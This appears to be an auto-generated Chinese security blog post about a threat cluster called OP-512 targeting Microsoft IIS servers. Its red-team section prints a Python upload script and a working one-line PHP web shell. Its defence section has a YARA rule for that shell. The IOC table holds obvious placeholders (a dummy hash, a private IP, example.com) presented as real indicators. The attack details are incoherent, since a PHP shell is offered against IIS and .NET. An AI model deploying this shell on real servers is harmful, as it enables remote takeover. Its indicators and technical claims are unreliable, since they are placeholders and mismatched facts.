---
layout: post
title:  "New Threat Cluster OP-512 Targets Microsoft IIS Servers with Custom Web Shell Framework"
date:   2026-06-05 14:31:48 +0000
categories: [security]
severity: high
---

# 🔥 解析 OP-512 威脅集群：利用 IIS 伺服器進行間諜活動
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Web Shell Framework, Timestomping, Cryptographic Controls

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: IIS 伺服器的 worker process ("w3wp.exe") 可以被利用來下載和執行惡意程式碼，導致遠端代碼執行漏洞。
* **攻擊流程圖解**:
  1. 攻擊者發送惡意請求到 IIS 伺服器。
  2. IIS 伺服器的 worker process 下載和執行惡意程式碼。
  3. 惡意程式碼建立 Web Shell 連線。
  4. 攻擊者通過 Web Shell 連線遠端控制 IIS 伺服器。
* **受影響元件**: IIS 伺服器 (特別是 Windows Server 2016 和 end-of-life .NET Framework 4.0)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 IIS 伺服器的管理權限或能夠利用 IIS 伺服器的漏洞。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意程式碼
    payload = """
    <?php
      // Web Shell 代碼
      $command = $_GET['cmd'];
      system($command);
    ?>
    """
    
    # 發送惡意請求到 IIS 伺服器
    response = requests.post("http://example.com/upload.php", data=payload)
    
    # 確認 Web Shell 連線
    if response.status_code == 200:
      print("Web Shell 連線成功")
    
    ```
* **繞過技術**: 攻擊者可以使用 Timestomping 技術來隱藏惡意程式碼的創建和修改時間，從而避免被偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /upload.php |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule OP_512_Web_Shell {
      meta:
        description = "OP-512 Web Shell"
        author = "Your Name"
      strings:
        $web_shell = "<?php system($_GET['cmd']); ?>"
      condition:
        $web_shell
    }
    
    ```
* **緩解措施**: 更新 IIS 伺服器的安全補丁，限制 IIS 伺服器的管理權限，監控 IIS 伺服器的異常行為。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Timestomping**: 一種技術，用於隱藏檔案的創建和修改時間，從而避免被偵測。
* **Web Shell**: 一種遠端控制工具，允許攻擊者遠端控制受害者機器。
* **Cryptographic Controls**: 一種安全技術，用於保護資料的機密性和完整性。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/new-threat-cluster-op-512-targets.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


